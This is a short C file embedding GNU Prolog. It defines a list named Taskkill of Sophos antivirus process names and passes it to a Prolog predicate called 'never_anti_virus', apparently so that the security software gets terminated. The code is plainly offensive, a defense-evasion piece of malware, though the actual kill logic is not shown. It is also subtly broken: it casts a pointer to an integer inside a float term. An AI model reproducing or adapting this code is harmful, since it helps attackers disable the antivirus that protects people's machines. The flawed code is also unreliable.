#include <gprolog.h>


const char *Taskkill[] = {"ALMon.exe","ALsvc.exe","swi_service.exe","SAVAdminService.exe", "SavService.exe",0};



int NeverAntiVirus(void)
{
   
    char command[255] = {0};
	
    //pl init
    int return_value;
    int func;
    PlTerm arg[10];
    PlBool res;
	
	//register a predicate
    func = Pl_Find_Atom("never_anti_virus");
    //printf("%s\n","ririririri");
    //char* str=argv[1];
    //int input = atoi(str);
    Pl_Query_Begin(PL_FALSE);
	
	
    arg[0] = Pl_Mk_Float((unsigned int)Taskkill);
    //arg[1] = Pl_Mk_Float((unsigned int)command);
	
    res = Pl_Query_Call(func, 1, arg);
	
    Pl_Query_End(PL_KEEP_FOR_PROLOG);
	
    return 0;
	

}



int main(int argc, char **argv){
  Pl_Start_Prolog(argc, argv);
  
  NeverAntiVirus();

  Pl_Stop_Prolog();

  return 0;


}
